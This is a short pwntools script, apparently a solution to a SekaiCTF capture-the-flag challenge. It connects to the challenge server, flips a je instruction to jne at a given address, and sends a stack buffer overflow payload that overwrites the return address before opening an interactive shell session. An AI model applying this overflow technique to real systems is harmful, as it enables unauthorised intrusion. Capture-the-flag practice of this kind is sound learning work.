from pwn import *
r = remote('chals.sekai.team', 4077)
r.sendline(b'0x004016f4')
r.sendline(b'7') # 0x74 (je) -> 0x75 (jne)
r.sendline(b'a'*(0x30+8)+p64(0x004012d6))
r.interactive()

